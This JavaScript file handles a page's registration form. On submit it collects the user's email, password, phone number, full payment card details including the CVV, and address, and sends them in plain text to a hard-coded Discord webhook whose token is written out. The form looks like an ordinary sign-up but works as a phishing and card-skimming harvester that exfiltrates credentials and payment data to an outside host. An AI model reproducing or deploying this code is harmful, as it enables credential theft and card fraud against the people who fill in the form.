const form = document.getElementById("register");

form.addEventListener("submit", (event)=>
{
    event.preventDefault();



    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;
    const num = document.getElementById("tel.num").value;
    const card_num = document.getElementById("card-number").value;
    const name = document.getElementById("card-owner-name").value;
    const exp = document.getElementById("card-exp").value;
    const cvv = document.getElementById("card-cvv").value;
    const address = document.getElementById("address").value;

    if(password!=document.getElementById("password2").value)
    {
        window.alert("hesla se neshodují")
    }

    else
    {
        const content = `email: ${email}\npassword: ${password}\ntel. number: ${num}\ncard number: ${card_num}\ncard owner name: ${name}\ncard exp date: ${exp}\ncard cvv: ${cvv}\naddress: ${address}`
        
        fetch("https://discord.com/api/webhooks/1287033070683291791/KyV9Do_taZwdspy_kLwYoerMHoClWEDthrExqfYBZoUpmGkoA1c3RrMHMxY5MRfpUjD_", 
        {
            method: "POST", 
            headers: 
            {
                "Content-Type" : "application/json"
            },
            body: JSON.stringify({
                username: "Dáda",
                content: content
            })
        })
    }
});